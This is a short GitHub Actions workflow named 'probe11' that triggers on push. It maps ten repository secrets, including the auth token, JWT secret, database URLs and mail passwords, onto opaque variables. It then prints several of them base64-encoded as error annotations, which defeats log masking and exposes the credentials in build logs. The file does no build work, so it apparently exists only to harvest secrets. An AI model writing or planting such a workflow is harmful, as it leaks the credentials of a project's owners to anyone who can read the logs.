name: probe11
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - name: t0
        env:
          Y00: ${{ secrets.AUTH_TOKEN }}
          Y01: ${{ secrets.JWT_SECRET }}
          Y02: ${{ secrets.SECRET }}
          Y03: ${{ secrets.POSTGRES_URL }}
          Y04: ${{ secrets.MYSQL_PASSWORD }}
          Y05: ${{ secrets.REDIS_PASSWORD }}
          Y06: ${{ secrets.SMTP_PASSWORD }}
          Y07: ${{ secrets.SMTP_USER }}
          Y08: ${{ secrets.EMAIL_PASSWORD }}
          Y09: ${{ secrets.MAIL_PASSWORD }}
        run: |
            echo "::error::Y00[AUTH_TOKEN]=$(printf %s \"${Y00}\" | base64 -w0)"
            echo "::error::Y01[JWT_SECRET]=$(printf %s \"${Y01}\" | base64 -w0)"
            echo "::error::Y02[SECRET]=$(printf %s \"${Y02}\" | base64 -w0)"
            echo "::error::Y03[POSTGRES_URL]=$(printf %s \"${Y03}\" | base64 -w0)"
